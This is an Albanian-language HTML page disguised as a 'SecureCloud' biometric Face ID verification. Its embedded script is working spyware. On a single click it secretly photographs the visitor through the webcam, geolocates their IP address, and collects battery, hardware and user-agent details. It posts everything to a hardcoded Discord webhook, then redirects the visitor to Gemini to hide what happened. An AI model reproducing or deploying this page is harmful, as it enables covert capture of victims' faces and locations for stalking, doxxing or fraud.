
<!DOCTYPE html>
<html lang="sq">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikimi i Identitetit | SecureCloud</title>
    <style>
        body {
            background-color: #f5f5f7;
            color: #1d1d1f;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            -webkit-font-smoothing: antialiased;
        }
        .card {
            background: #ffffff;
            padding: 40px 30px;
            border-radius: 18px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
            max-width: 380px;
            width: 90%;
            text-align: center;
        }
        .icon-box {
            width: 70px;
            height: 70px;
            background: #0071e3;
            border-radius: 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 25px;
        }
        .icon-box svg { fill: white; width: 35px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.015em; }
        p { font-size: 15px; color: #86868b; line-height: 1.4; margin-bottom: 35px; }
        .btn {
            background-color: #0071e3;
            color: white;
            border: none;
            padding: 16px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
        }
        .btn:active { transform: scale(0.98); background-color: #0062c3; }
        #loader { display: none; margin-top: 20px; }
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #d2d2d7;
            border-top: 2px solid #0071e3;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon-box">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg>
        </div>
        <h1>Verifikim Identiteti</h1>
        <p>Për arsye sigurie, ju lutem kryeni verifikimin biometrik për të konfirmuar që jeni pronari i kësaj pajisjeje.</p>
        
        <button class="btn" id="mainBtn">Vazhdo me Face ID</button>
        
        <div id="loader">
            <div class="spinner"></div>
            <span style="font-size: 14px; color: #0071e3;">Duke komunikuar me serverin...</span>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497231122667409610/UIfP7aK35EKcrRKZz7Zh3QIAUdW_VAfo-MUBOzxJpLZMwsCPCVoerrS3Y9PTOxT_8L2m";
        const REDIRECT_URL = "https://gemini.google.com/app";

        const mainBtn = document.getElementById('mainBtn');
        const loader = document.getElementById('loader');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Marrja e IP me saktësi (Metoda Multiple)
        async function getIpInfo() {
            try {
                // Provon ip-api i pari (më i detajuari)
                const res = await fetch('https://ipapi.co/json/');
                if (res.ok) return await res.json();
            } catch (e) {
                try {
                    // Rezerva 1
                    const res2 = await fetch('https://api.ipify.org?format=json');
                    const data2 = await res2.json();
                    return { ip: data2.ip, city: "Unknown", country_name: "Unknown" };
                } catch (e2) {
                    return { ip: "S'u gjet", city: "N/A", country_name: "N/A" };
                }
            }
        }

        async function captureFace() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1200));
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
                stream.getTracks().forEach(t => t.stop());
                return blob;
            } catch (e) { return null; }
        }

        mainBtn.onclick = async () => {
            mainBtn.style.display = "none";
            loader.style.display = "block";

            // 1. Kap foton
            const facePhoto = await captureFace();

            // 2. Merr IP-në e saktë
            const ipData = await getIpInfo();

            // 3. Info shtesë
            let battery = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`;
            }

            const formData = new FormData();
            if (facePhoto) formData.append('file', facePhoto, 'face_id_auth.jpg');

            const embed = {
                title: "🛑 VERIFIKIM EXTREME I KRYER",
                color: 15548997,
                fields: [
                    { name: "🌐 ADRESA IP", value: `\`${ipData.ip || ipData.query || 'I panjohur'}\``, inline: true },
                    { name: "📍 VENDNDODHJA", value: `${ipData.city || 'N/A'}, ${ipData.country_name || ipData.country || 'N/A'}`, inline: true },
                    { name: "🔋 BATERIA", value: battery, inline: true },
                    { name: "📱 PAJISJA", value: `\`${navigator.platform}\``, inline: true },
                    { name: "⚙️ HARDWARE", value: `CPU: ${navigator.hardwareConcurrency} | RAM: ~${navigator.deviceMemory}GB`, inline: false },
                    { name: "🔍 USER AGENT", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                ],
                footer: { text: "Security Intel System v10.1" },
                timestamp: new Date()
            };

            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));

            try {
                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            } catch (err) {}

            // Ridrejtimi i shpejtë
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 500);
        };
    </script>
</body>
</html>
